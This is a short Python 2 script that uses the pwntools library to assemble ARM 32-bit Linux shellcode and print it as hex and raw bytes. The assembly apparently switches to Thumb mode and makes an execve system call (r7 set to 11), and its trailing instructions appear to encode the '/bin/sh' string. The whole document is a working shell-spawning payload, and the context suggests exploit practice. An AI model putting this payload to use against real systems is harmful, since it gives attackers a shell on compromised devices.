from pwn import *
shellcode = '''
add r3, pc, #1  
bx  r3
mov r0, pc
adds    r0, #8
subs    r1, r1, r1
subs    r2, r2, r2
movs    r7, #11
svc 1
str r7, [r5, #32]
ldr r1, [r5, #100]
strb    r7, [r5, #12]
lsls    r0, r5, #1
'''
print asm(shellcode, arch = 'arm', os = 'linux', bits=32).encode('hex')
print asm(shellcode, arch = 'arm', os = 'linux', bits=32)
